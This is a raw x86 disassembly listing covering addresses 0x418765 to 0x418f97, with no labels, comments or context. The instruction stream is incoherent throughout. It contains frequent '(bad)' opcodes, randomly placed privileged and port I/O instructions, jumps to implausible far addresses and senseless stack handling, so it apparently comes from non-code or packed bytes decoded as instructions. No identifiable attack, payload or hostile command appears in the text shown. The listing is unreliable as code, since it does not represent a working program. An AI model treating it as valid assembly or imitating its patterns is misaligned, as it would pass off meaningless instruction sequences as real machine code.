  418765:	push   ebp
  418766:	mov    eax,0xf8028b
  41876b:	jne    0x41872e
  41876d:	mov    esi,ecx
  41876f:	mov    esp,DWORD PTR [ebp+0x2c]
  418772:	add    edi,DWORD PTR [ebp-0x24]
  418775:	sub    esp,eax
  418777:	and    al,0x45
  418779:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  41877f:	sbb    al,0xee
  418781:	pop    esi
  418782:	call   0x8187b2
  418787:	fsubr  st,st(3)
  418789:	sti    
  41878a:	add    BYTE PTR gs:[ecx],bh
  41878d:	add    eax,esp
  41878f:	add    DWORD PTR [esi],eax
  418791:	rol    DWORD PTR [ebp+0x8],0x29
  418795:	mov    esp,eax
  418797:	clc    
  418798:	jne    0x41880f
  41879a:	mov    eax,0x8b0673
  41879f:	loopne 0x4187e6
  4187a1:	loopne 0x41872c
  4187a3:	lods   al,BYTE PTR ds:[esi]
  4187a4:	int3   
  4187a5:	inc    ebp
  4187a6:	mov    DWORD PTR gs:[eax+edi*8],eax
  4187aa:	add    al,0xc3
  4187ac:	sub    ecx,DWORD PTR [ebp+0x47]
  4187af:	(bad)  
  4187b1:	shr    BYTE PTR [ebp-0x1f],0xe8
  4187b5:	add    eax,DWORD PTR [eax]
  4187b7:	call   0x64348bc
  4187bc:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4187c2:	dec    esi
  4187c3:	ins    DWORD PTR es:[edi],dx
  4187c4:	in     al,dx
  4187c5:	lea    eax,[eax]
  4187c7:	inc    ebp
  4187c8:	inc    ebp
  4187c9:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4187cf:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4187d9:	and    al,0xdc
  4187db:	ror    DWORD PTR [edx+0x24],0xf7
  4187df:	or     BYTE PTR [ebp+0x4c],dh
  4187e2:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4187e6:	stos   BYTE PTR es:[edi],al
  4187e7:	adc    edx,edi
  4187e9:	inc    esp
  4187ea:	add    edi,DWORD PTR [eax]
  4187ec:	jne    0x4187d1
  4187ee:	mov    DWORD PTR [eax-0x7449db04],ecx
  4187f4:	cmp    ecx,DWORD PTR [edi]
  4187f6:	sub    BYTE PTR [ebp-0x7e],dl
  4187f9:	sar    ebp,0xb
  4187fc:	jmp    FWORD PTR [edi+0x2400392a]
  418802:	sub    esi,DWORD PTR [ebx-0x73]
  418805:	mov    esp,DWORD PTR [ecx+edi*4]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	and    BYTE PTR [eax],al
  41880c:	jne    0x4187d8
  41880e:	sub    ebp,ecx
  418810:	sbb    BYTE PTR [esi+0x32],ah
  418813:	dec    ebp
  418814:	push   ebp
  418815:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41881b:	ret    
  41881c:	mov    edx,ebp
  41881e:	leave  
  41881f:	sub    DWORD PTR [esi+0x24],ebx
  418822:	ret    0x2b
  418825:	pop    ax
  418827:	push   ebp
  418828:	rol    BYTE PTR [ebx],0xeb
  41882b:	add    DWORD PTR [ecx+0x6c0001],0x40
  418832:	jb     0x418889
  418834:	ret    
  418835:	in     al,dx
  418836:	jecxz  0x4187c3
  418838:	push   esi
  418839:	xchg   esp,eax
  41883a:	jne    0x41883c
  41883c:	cmp    edx,DWORD PTR [esi+0x1c]
  41883f:	jne    0x418825
  418841:	mov    eax,DWORD PTR [ebp-0x77]
  418844:	ror    DWORD PTR [ebx+0x899408],0xe0
  41884b:	mov    esi,DWORD PTR [ebp-0x75]
  41884e:	pop    esi
  41884f:	nop
  418850:	mov    eax,DWORD PTR [eax]
  418852:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  418858:	add    al,0x0
  41885a:	inc    ebp
  41885b:	mov    eax,DWORD PTR [ebx]
  41885d:	mov    ebp,ebx
  41885f:	cmp    al,0xf
  418861:	or     al,al
  418863:	inc    ebp
  418864:	inc    ebp
  418865:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41886b:	cld    
  41886c:	add    BYTE PTR [edi+0x556c16c0],dh
  418872:	add    BYTE PTR [ecx-0x5],dl
  418875:	add    eax,0x17200
  41887a:	sbb    al,0x85
  41887c:	dec    esp
  41887d:	je     0x4188b7
  41887f:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  418883:	add    BYTE PTR [ebx],bh
  418885:	(bad)  
  418886:	and    al,0x30
  418888:	jae    0x418826
  41888a:	mov    cl,cl
  41888c:	inc    DWORD PTR [esp]
  41888f:	push   ebp
  418890:	shr    esp,0x8
  418893:	in     al,dx
  418894:	push   esp
  418895:	add    DWORD PTR [eax],esp
  418897:	add    bl,cl
  418899:	inc    ebp
  41889a:	mov    bh,0x53
  41889c:	add    BYTE PTR [ebp-0x17],al
  41889f:	push   esi
  4188a0:	cmovne ecx,edx
  4188a3:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4188a7:	push   edi
  4188a8:	pop    ss
  4188a9:	xor    ecx,ebx
  4188ab:	pushf  
  4188ac:	add    BYTE PTR [ecx+0x452bf800],cl
  4188b2:	rcr    ecx,0x5
  4188b5:	inc    ebp
  4188b6:	add    esp,ebx
  4188b8:	add    BYTE PTR [ebp-0x40],al
  4188bb:	out    0x6c,eax
  4188bd:	inc    ebp
  4188be:	inc    eax
  4188bf:	sub    eax,0x450547c1
  4188c4:	dec    esp
  4188c5:	and    BYTE PTR cs:[ebp-0x27],al
  4188c9:	jo     0x4188f4
  4188cb:	leave  
  4188cc:	add    BYTE PTR [esi+0xc000c0],bh
  4188d2:	lea    eax,[esp-0x40]
  4188d6:	ret    
  4188d7:	mov    dh,0x8b
  4188d9:	xor    edx,DWORD PTR [ecx+0x3]
  4188dc:	mov    al,BYTE PTR [ecx+0x1]
  4188df:	sbb    BYTE PTR [eax],al
  4188e1:	stc    
  4188e2:	mov    esi,DWORD PTR [edx+0x8]
  4188e5:	(bad)  
  4188e6:	ss mov eax,0xb98ac631
  4188ec:	add    esi,eax
  4188ee:	add    BYTE PTR [edx-0x444d39f7],bh
  4188f4:	add    esi,eax
  4188f6:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  4188fd:	mov    BYTE PTR [eax],0xbe
  418900:	or     BYTE PTR [ebx],dh
  418902:	dec    ecx
  418903:	lea    eax,[ebx]
  418905:	or     eax,0x18fc0fc7
  41890a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41890b:	(bad)  
  41890d:	fiadd  WORD PTR [ebp-0x78]
  418910:	jae    0xed76905f
  418916:	or     BYTE PTR [ebp+0x7],al
  418919:	in     eax,dx
  41891a:	pushf  
  41891b:	inc    ebp
  41891c:	xor    bl,al
  41891e:	pop    esi
  41891f:	inc    ebp
  418920:	shl    esp,0xc
  418923:	inc    ebp
  418924:	sub    cl,0x1
  418927:	inc    ebp
  418928:	add    bh,bl
  41892a:	add    BYTE PTR [ebp-0x7b],al
  41892d:	loopne 0x418927
  41892f:	inc    ebp
  418930:	ret    0xe7
  418933:	inc    ebp
  418934:	mov    esi,DWORD PTR [eax-0x7f]
  418937:	leave  
  418938:	and    al,0x44
  41893a:	add    BYTE PTR [eax+0x331cb68b],dh
  418940:	mov    DWORD PTR [ebx],eax
  418942:	sbb    al,0x41
  418944:	(bad)  
  418945:	sbb    al,ah
  418947:	stc    
  418948:	test   DWORD PTR [edx-0x8],esi
  41894b:	lea    edi,[edi-0x7007a98]
  418951:	mov    DWORD PTR [ebp-0x2c],edi
  418954:	(bad)  
  418955:	dec    ebp
  418956:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  41895d:	add    edx,eax
  41895f:	(bad)  
  418960:	(bad)  
  418961:	inc    ebx
  418963:	jmp    FWORD PTR [edx-0x38]
  418966:	(bad)  
  418967:	or     al,ah
  418969:	jge    0x418931
  41896b:	mov    ebp,0x5a8533e4
  418971:	clc    
  418972:	leave  
  418973:	inc    ebp
  418974:	add    BYTE PTR [ebx+0xd8c8d],cl
  41897a:	rdpmc  
  41897c:	sbb    BYTE PTR [edi+0x7de08da],bh
  418982:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  418989:	cmovne edx,ebx
  41898c:	jmp    0x41898e
  41898e:	inc    ebp
  41898f:	mov    ebp,ebp
  418991:	sbb    al,0x45
  418993:	mov    ebx,ebx
  418995:	add    DWORD PTR [ebp+0x0],eax
  418998:	out    dx,al
  418999:	add    DWORD PTR [ebp+0x4d],eax
  41899c:	sub    eax,0x2e80458b
  4189a1:	add    BYTE PTR [ebp-0x77],al
  4189a4:	jo     0x418a10
  4189a6:	leave  
  4189a7:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4189af:	inc    ebp
  4189b0:	add    ebx,edi
  4189b2:	inc    ecx
  4189b3:	out    0x18,eax
  4189b5:	(bad)  
  4189b6:	stc    
  4189b7:	int3   
  4189b8:	jb     0x418944
  4189ba:	(bad)  
  4189bb:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4189c1:	or     dh,al
  4189c3:	dec    esi
  4189c4:	mov    dl,0xf3
  4189c6:	mov    BYTE PTR [ebp-0x4d],0x89
  4189ca:	(bad)  
  4189cb:	loopne 0x418981
  4189cd:	inc    esi
  4189cf:	lea    esi,[ebp-0x49003924]
  4189d5:	push   eax
  4189d6:	mov    BYTE PTR [ebp-0x49],0x33
  4189da:	xor    eax,DWORD PTR [ebx]
  4189dc:	lea    edx,[eax+0xd]
  4189df:	inc    ebp
  4189e0:	jae    0x8c1beffe
  4189e6:	ficomp WORD PTR [eax+ecx*4]
  4189e9:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  4189f0:	test   esi,edi
  4189f2:	(bad)  
  4189f3:	(bad)  
  4189f4:	inc    DWORD PTR [eax]
  4189f6:	inc    ebp
  4189f7:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  4189fd:	test   DWORD PTR [ebx],edx
  4189ff:	jne    0x41898a
  418a01:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  418a0b:	jmp    0x1258a99
  418a10:	inc    ebp
  418a11:	jne    0x4189f5
  418a13:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  418a1a:	mov    BYTE PTR [ebp+0x45009c01],cl
  418a20:	shl    BYTE PTR [eax],0x55
  418a23:	push   cx
  418a25:	mov    bx,0x7245
  418a29:	gs add bh,al
  418a2c:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  418a33:	inc    ebp
  418a34:	dec    ebp
  418a35:	into   
  418a36:	mov    esp,ebx
  418a38:	jl     0x418a01
  418a3a:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  418a41:	inc    ebp
  418a42:	mov    edi,ebx
  418a44:	add    ebp,esp
  418a46:	add    BYTE PTR [esi+0x1],ah
  418a49:	inc    ebp
  418a4a:	or     BYTE PTR [edi],bh
  418a4c:	inc    ebp
  418a4d:	(bad)  
  418a4e:	in     eax,dx
  418a4f:	fsubr  st(4),st
  418a51:	inc    edi
  418a53:	add    dl,al
  418a55:	add    al,ah
  418a57:	call   0x86a2cc
  418a5c:	pop    esi
  418a5d:	test   DWORD PTR [eax],ecx
  418a5f:	dec    dl
  418a61:	(bad)  
  418a62:	jmp    0x414012ec
  418a67:	push   DWORD PTR [ebp-0x75]
  418a6a:	(bad)  
  418a6b:	loopne 0x418a39
  418a6d:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  418a77:	push   eax
  418a78:	inc    DWORD PTR [ebp-0x75]
  418a7b:	mov    esp,eax
  418a7d:	cwde   
  418a7e:	mov    DWORD PTR [eax],0xff8bffc3
  418a84:	sbb    al,0x8
  418a86:	ror    BYTE PTR [ebp+0x50],0x51
  418a8a:	inc    ebp
  418a8b:	ror    BYTE PTR [ebx+0x65987d],1
  418a91:	test   edi,eax
  418a93:	add    al,0xdc
  418a95:	add    bh,bh
  418a97:	push   0x1
  418a99:	add    BYTE PTR [eax],al
  418a9b:	mov    edi,edi
  418a9d:	inc    WORD PTR [ebp+0x8]
  418aa1:	add    eax,0xd
  418aa4:	(bad)  
  418aa6:	xor    eax,0x782ec89
  418aab:	push   ecx
  418aac:	cli    
  418aad:	popw   es
  418aaf:	push   ebp
  418ab0:	xchg   BYTE PTR [ebx-0x76740800],al
  418ab6:	sbb    al,0x86
  418ab8:	test   DWORD PTR [ecx-0x2],edx
  418abb:	call   WORD PTR [ebp-0x40]
  418abf:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  418ac3:	mov    eax,ebx
  418ac5:	mov    dh,BYTE PTR ds:0xc7666851
  418acb:	push   ebp
  418acc:	fsub   QWORD PTR [esi+0x0]
  418acf:	dec    ebp
  418ad0:	inc    ebp
  418ad1:	mov    edx,0xec4ec0
  418ad6:	(bad)  
  418ad7:	retf   0x89a0
  418ada:	fist   DWORD PTR [eax+0x454ae1]
  418ae0:	jmp    0xa8b5:0xc7663e8b
  418ae7:	jmp    edx
  418ae9:	(bad)  
  418aea:	in     eax,dx
  418aeb:	lock (bad) 
  418aed:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  418af4:	(bad)  
  418af5:	xor    eax,0x700089ff
  418afa:	add    bh,bh
  418afc:	stos   DWORD PTR es:[edi],eax
  418afd:	data16 add BYTE PTR [ebp-0x1b0077],al
  418b04:	inc    DWORD PTR [ecx-0x73]
  418b07:	data16 fadd QWORD PTR [ebp-0xaf0001]
  418b0e:	inc    ebp
  418b0f:	shl    BYTE PTR [ebx],0x66
  418b12:	add    eax,DWORD PTR [ebp-0xba00b0]
  418b18:	add    DWORD PTR [ecx+0x44],0x66
  418b1c:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  418b22:	add    DWORD PTR [ecx-0xcf8600],ecx
  418b28:	push   ebp
  418b29:	lea    dx,[ebp-0x28]
  418b30:	add    BYTE PTR [ebp-0x25],0xf
  418b34:	jge    0xff428a3b
  418b3a:	mov    ecx,0xc34fc7
  418b3f:	rol    ecx,0x89
  418b42:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  418b46:	ror    BYTE PTR [ebx-0x48990775],0x55
  418b4d:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  418b54:	test   BYTE PTR [ecx-0x3f997f3e],cl
  418b5a:	push   ebp
  418b5b:	mov    DWORD PTR [ebp-0x76761480],ecx
  418b61:	or     BYTE PTR [eax+0x6600c265],0x45
  418b68:	push   ebp
  418b69:	xor    DWORD PTR [ebp-0x76381e64],ecx
  418b6f:	aam    0x8c
  418b71:	test   DWORD PTR [ecx-0x3dba7108],ecx
  418b77:	cmp    eax,0xc78b9c00
  418b7c:	data16 hlt 
  418b7e:	dec    ebp
  418b7f:	test   DWORD PTR [ecx+0x454ff8],edi
  418b85:	xor    ecx,esi
  418b87:	lahf   
  418b88:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  418b8e:	mov    eax,DWORD PTR [ecx]
  418b90:	data16 add BYTE PTR [ebp-0x7400bb],dh
  418b97:	sbb    al,0x71
  418b99:	dec    ebp
  418b9a:	mov    si,WORD PTR [ebp-0xff0074]
  418ba1:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  418ba7:	add    BYTE PTR [ebp-0x760fd477],cl
  418bad:	jne    0x418c23
  418baf:	test   edi,edi
  418bb1:	jne    0x418b36
  418bb3:	(bad)  
  418bb4:	sti    
  418bb5:	sbb    BYTE PTR [ecx-0x1789ab],cl
  418bbb:	cld    
  418bbc:	(bad)  
  418bbd:	jmp    DWORD PTR [ecx]
  418bbf:	inc    ebp
  418bc0:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  418bc6:	data16 cmp al,0x8d
  418bc9:	push   cs
  418bca:	inc    DWORD PTR [ebp-0x1]
  418bcd:	test   DWORD PTR [ecx-0x838c],ecx
  418bd3:	sbb    al,0x8b
  418bd5:	lock clc 
  418bd7:	push   DWORD PTR [edi-0xe39375]
  418bdd:	xor    BYTE PTR [ebx],0x1
  418be0:	add    eax,DWORD PTR [eax]
  418be2:	xor    eax,DWORD PTR [eax]
  418be4:	mov    WORD PTR [ebp-0xba003d],0x4575
  418bed:	mov    ecx,DWORD PTR [edi]
  418bef:	sbb    al,0x4d
  418bf1:	mov    DWORD PTR [ebx],esi
  418bf3:	add    DWORD PTR [ebx],eax
  418bf5:	add    BYTE PTR [ebx],dh
  418bf7:	xor    DWORD PTR [esi-0x80],esp
  418bfa:	inc    ebp
  418bfb:	add    DWORD PTR [ebx],esi
  418bfd:	add    BYTE PTR [esi+0x50],ah
  418c00:	inc    ebp
  418c01:	jmp    0x868e6c
  418c06:	add    DWORD PTR [eax+0xc70194],0xffffffec
  418c0d:	or     BYTE PTR [ebp+0x4501f845],dh
  418c13:	jmp    0xdd8f09
  418c18:	(bad)  
  418c19:	push   cs
  418c1a:	in     al,0xc9
  418c1c:	test   DWORD PTR [ebp+0x4502f8],eax
  418c22:	xor    ecx,DWORD PTR [ebp-0x64]
  418c25:	mov    eax,edi
  418c27:	mov    esp,esp
  418c29:	push   eax
  418c2a:	add    eax,0x45fff885
  418c2f:	dec    DWORD PTR [ebx+0x339445]
  418c35:	add    ecx,DWORD PTR [ecx+0x452ce889]
  418c3b:	dec    DWORD PTR [ebx-0x4e0be375]
  418c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c42:	add    edi,edi
  418c44:	add    bh,bh
  418c46:	push   cs
  418c47:	xor    eax,DWORD PTR [eax+0x890103]
  418c4d:	xor    BYTE PTR [ebp-0x1],al
  418c50:	mov    DWORD PTR [ebp-0x36df38],ecx
  418c56:	push   cs
  418c57:	push   eax
  418c58:	jne    0x418c9f
  418c5a:	mov    esi,DWORD PTR [ebx]
  418c5c:	sbb    al,0x3
  418c5e:	jne    0x418cb0
  418c60:	inc    DWORD PTR [ebp-0x75]
  418c63:	add    eax,0x800f0
  418c68:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  418c6e:	mov    DWORD PTR [ecx],eax
  418c70:	sbb    BYTE PTR [eax],al
  418c72:	leave  
  418c73:	test   DWORD PTR [edi-0x1],eax
  418c76:	jne    0x418c77
  418c78:	call   0xff42777d
  418c7d:	xor    BYTE PTR [ebp+0x4d],al
  418c80:	mov    edi,edi
  418c82:	enter  0x8,0x4d
  418c86:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  418c8c:	mov    eax,DWORD PTR [eax]
  418c8e:	sbb    al,0x1
  418c90:	sbb    DWORD PTR [ebp+0x4d],eax
  418c93:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  418c99:	inc    eax
  418c9a:	dec    DWORD PTR [ecx-0x27d775]
  418ca0:	add    BYTE PTR [ebx-0x38d72b01],cl
  418ca6:	xchg   ecx,eax
  418ca7:	ret    
  418ca8:	add    BYTE PTR [ebp-0x830075],al
  418cae:	add    BYTE PTR [ebp-0x75],al
  418cb1:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  418cb7:	lea    edi,[edi+0x20]
  418cba:	add    bh,bh
  418cbc:	mov    edx,DWORD PTR [eax-0x7b]
  418cbf:	inc    ebp
  418cc0:	rdpmc  
  418cc2:	jne    0x418cc7
  418cc4:	add    BYTE PTR [eax-0x75],dl
  418cc7:	inc    ebp
  418cc8:	call   0x404195d2
  418ccd:	add    BYTE PTR [ecx-0xe3d775],cl
  418cd3:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  418cda:	ret    
  418cdb:	inc    DWORD PTR [ebp-0xff0001]
  418ce1:	add    BYTE PTR [ebp-0x4b],al
  418ce4:	cmp    edi,0x24
  418ce7:	(bad)  
  418ce8:	push   DWORD PTR [eax]
  418cea:	add    BYTE PTR [ebp-0x39],dl
  418ced:	test   ebx,eax
  418cef:	je     0x418c76
  418cf1:	mov    edi,edi
  418cf3:	sbb    bh,bh
  418cf5:	test   DWORD PTR gs:[eax],eax
  418cf8:	(bad)  
  418cf9:	js     0x418cfa
  418cfb:	add    BYTE PTR [ebx-0x38b21fdd],cl
  418d01:	sub    eax,ebx
  418d03:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  418d09:	add    eax,DWORD PTR [eax]
  418d0b:	dec    ebp
  418d0c:	push   eax
  418d0d:	mov    al,BYTE PTR [ebp+0x1]
  418d10:	mov    eax,DWORD PTR [ebp-0x68]
  418d13:	mov    eax,DWORD PTR [eax]
  418d15:	cld    
  418d16:	(bad)  
  418d17:	or     BYTE PTR [eax],ah
  418d19:	dec    ebp
  418d1a:	inc    DWORD PTR [eax+0x4]
  418d1d:	push   ecx
  418d1e:	add    BYTE PTR [edx-0x1],dh
  418d21:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  418d27:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  418d31:	add    ecx,DWORD PTR [ecx-0xf037477]
  418d37:	push   ecx
  418d38:	xor    BYTE PTR [ebx],al
  418d3a:	inc    ebp
  418d3b:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  418d41:	(bad)  
  418d42:	push   eax
  418d44:	inc    DWORD PTR [eax]
  418d46:	inc    ebp
  418d47:	add    BYTE PTR [ebx],dh
  418d49:	add    BYTE PTR [ebx],0x0
  418d4c:	mov    DWORD PTR [ebx-0x150007d4],eax
  418d52:	lea    edx,[ebp-0x6c]
  418d55:	je     0x418cdc
  418d57:	(bad)  
  418d58:	dec    DWORD PTR [eax]
  418d5a:	call   DWORD PTR [ebp-0x7b]
  418d5d:	mov    edi,edi
  418d5f:	hlt    
  418d60:	call   DWORD PTR [ebp-0x75]
  418d63:	mov    esp,eax
  418d65:	cwde   
  418d66:	(bad)  
  418d67:	mov    bh,0xc3
  418d69:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  418d6f:	add    DWORD PTR [eax],0x450050ff
  418d75:	mov    DWORD PTR [ebx+0x9598c8],ecx
  418d7b:	inc    edi
  418d7d:	jmp    DWORD PTR [eax]
  418d7f:	jmp    0xcd00:0x640481ff
  418d86:	mov    DWORD PTR [ebx],esi
  418d88:	and    al,0x81
  418d8a:	push   DWORD PTR [edx]
  418d8c:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  418d93:	add    esi,DWORD PTR [eax]
  418d95:	enter  0x3c45,0x83
  418d99:	add    ah,bh
  418d9b:	adc    DWORD PTR [ebx+0x768b5055],eax
  418da1:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  418da7:	mov    esi,eax
  418da9:	xor    BYTE PTR [ebp+0x45],cl
  418dac:	jmp    0x418d39
  418dae:	mov    ebx,DWORD PTR [eax]
  418db0:	in     al,dx
  418db1:	inc    ebp
  418db2:	or     al,0x2
  418db4:	dec    DWORD PTR [ebp-0x4]
  418db7:	jne    0x418e0e
  418db9:	mov    ecx,DWORD PTR [eax+0x18558be8]
  418dbf:	mov    edi,DWORD PTR [ebx]
  418dc1:	lock push eax
  418dc3:	xchg   ecx,eax
  418dc4:	jmp    0x341dbc9
  418dc9:	adc    al,0x8b
  418dcb:	inc    ebp
  418dcc:	mov    al,ds:0x8b04008b
  418dd1:	push   ebp
  418dd2:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  418dd8:	push   ebp
  418dd9:	test   DWORD PTR [ebx-0x2900d701],ecx
  418ddf:	inc    ebp
  418de0:	dec    ebp
  418de1:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  418de7:	mov    DWORD PTR [eax],0xe9ff0020
  418ded:	add    al,0x0
  418def:	add    BYTE PTR [eax],al
  418df1:	mov    eax,edx
  418df3:	push   eax
  418df4:	rol    DWORD PTR [ebp-0xb0077],1
  418dfa:	bound  eax,QWORD PTR [ebp+0x50]
  418dfd:	xor    ecx,DWORD PTR [ecx+0x55899803]
  418e03:	sub    al,0x89
  418e05:	push   esp
  418e07:	lea    edx,[ebp-0x6c]
  418e0a:	jne    0xffd78d22
  418e10:	inc    DWORD PTR [ebp-0x1d0001]
  418e16:	jnp    0xc7976e1c
  418e1c:	mov    eax,ebx
  418e1e:	fs mov edi,edi
  418e21:	sbb    al,0xc1
  418e23:	out    dx,al
  418e24:	or     al,0x0
  418e26:	ret    0x8d50
  418e29:	inc    ebp
  418e2a:	dec    DWORD PTR [ebx+0xfa98d7]
  418e30:	test   edi,edi
  418e32:	clc    
  418e33:	call   FWORD PTR [edi]
  418e35:	or     BYTE PTR [eax],cl
  418e37:	inc    ebp
  418e38:	dec    ebp
  418e39:	inc    DWORD PTR [ebx+0x74803114]
  418e3f:	add    DWORD PTR [ebx+0x45fc00],ecx
  418e45:	call   DWORD PTR [eax+edx*1]
  418e48:	add    ecx,DWORD PTR [ebp-0x38]
  418e4b:	push   esi
  418e4c:	adc    al,0x8
  418e4e:	mov    edx,DWORD PTR [ebp-0x14]
  418e51:	mov    ecx,DWORD PTR [ebp-0x4]
  418e54:	add    DWORD PTR [ebp-0x68],0xffffff8d
  418e58:	inc    DWORD PTR [esp+esi*8]
  418e5b:	inc    ebp
  418e5c:	stos   BYTE PTR es:[edi],al
  418e5d:	mov    edx,DWORD PTR [ebp+0x1c]
  418e60:	add    DWORD PTR [ebp-0x10],eax
  418e63:	mov    edx,DWORD PTR [ebp-0x70]
  418e66:	cmp    eax,DWORD PTR [eax]
  418e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e69:	mov    eax,DWORD PTR [eax]
  418e6b:	sbb    al,0x73
  418e6d:	add    BYTE PTR [ebx],0x1
  418e70:	call   0x8971de75
  418e75:	xor    eax,ebp
  418e77:	pop    ds
  418e78:	inc    ebp
  418e79:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  418e7f:	(bad)  
  418e80:	push   DWORD PTR [edi]
  418e82:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  418e88:	push   DWORD PTR [ebx-0x1]
  418e8b:	mov    eax,DWORD PTR [ebp-0x740075]
  418e91:	sub    eax,DWORD PTR [eax]
  418e93:	add    eax,DWORD PTR [eax]
  418e95:	mov    DWORD PTR [ecx+0x5f],eax
  418e98:	mov    DWORD PTR [ebx+0x28],ebx
  418e9b:	ret    0xff
  418e9e:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  418ea4:	ret    
  418ea5:	mov    eax,DWORD PTR [ebp-0x6f0075]
  418eab:	add    BYTE PTR [ebp-0x7d],al
  418eae:	mov    DWORD PTR [eax],eax
  418eb0:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  418eb7:	sar    bh,cl
  418eb9:	test   BYTE PTR [eax+0x1],dl
  418ebc:	inc    ebp
  418ebd:	add    BYTE PTR [ebx],dh
  418ebf:	test   BYTE PTR [ebx],0x84
  418ec2:	push   eax
  418ec3:	add    BYTE PTR [ebp+0x0],al
  418ec6:	add    eax,0x86
  418ecb:	add    BYTE PTR [ebx-0x7f7be340],cl
  418ed1:	add    BYTE PTR [ecx],al
  418ed3:	add    BYTE PTR [eax],al
  418ed5:	mov    esi,0x550030
  418eda:	mov    ecx,DWORD PTR [edi]
  418edc:	sbb    al,0xda
  418ede:	jne    0x418ee0
  418ee0:	mov    edi,DWORD PTR [ecx]
  418ee2:	xor    BYTE PTR [eax+eax*1],0x84
  418ee6:	add    eax,DWORD PTR [eax]
  418ee8:	cld    
  418ee9:	add    BYTE PTR [ebp-0x4f],dh
  418eec:	mov    eax,DWORD PTR [ecx]
  418eee:	cld    
  418eef:	add    BYTE PTR [ecx-0x1bff009b],cl
  418ef5:	retf   0xe45
  418ef8:	add    eax,edx
  418efa:	sbb    al,0xb7
  418efc:	dec    ebp
  418efd:	or     al,0x89
  418eff:	dec    ebp
  418f00:	sbb    al,0xf
  418f02:	inc    ebp
  418f03:	dec    eax
  418f04:	mov    eax,DWORD PTR [ebx]
  418f06:	sbb    al,0xf
  418f08:	nop
  418f09:	scas   al,BYTE PTR es:[edi]
  418f0a:	add    DWORD PTR [eax],eax
  418f0c:	add    BYTE PTR [ebp-0x7674ebbb],cl
  418f12:	mov    eax,gs
  418f14:	add    bh,bh
  418f16:	mov    edi,edi
  418f18:	cmp    DWORD PTR [edi+0x72],edx
  418f1b:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  418f21:	gs cmp al,0x0
  418f24:	je     0x418efc
  418f26:	push   eax
  418f27:	sar    BYTE PTR [eax],1
  418f29:	mov    bh,0x3e
  418f2b:	push   cs
  418f2c:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  418f32:	add    DWORD PTR [ecx+0x12],ebp
  418f35:	dec    edx
  418f36:	(bad)  
  418f37:	mov    eax,edx
  418f39:	in     al,dx
  418f3a:	adc    DWORD PTR [ecx],esi
  418f3c:	pop    esi
  418f3d:	inc    ecx
  418f3e:	leave  
  418f3f:	or     DWORD PTR [eax],ebx
  418f41:	gs push ebp
  418f43:	add    ah,ch
  418f45:	into   
  418f46:	in     al,dx
  418f47:	enter  0xb756,0xf0
  418f4b:	push   cs
  418f4c:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  418f56:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  418f5c:	jnp    0x74421464
  418f62:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  418f68:	add    BYTE PTR [edi],cl
  418f6a:	mov    edi,DWORD PTR [ecx-0x78]
  418f6d:	ltr    WORD PTR [ecx-0x7b]
  418f71:	dec    DWORD PTR [edi]
  418f73:	clc    
  418f74:	out    0x45,eax
  418f76:	add    BYTE PTR [eax],cl
  418f78:	cmp    ebx,0xffffff8c
  418f7b:	jge    0x418f7d
  418f7d:	jb     0x418f8f
  418f7f:	je     0x508fff
  418f85:	pop    edx
  418f86:	push   esi
  418f87:	mov    ecx,DWORD PTR [edi]
  418f89:	in     al,dx
  418f8a:	rol    DWORD PTR [ebp+0x0],1
  418f8d:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  418f94:	cmp    DWORD PTR [ecx],0xfffffff0
  418f97:	hlt    
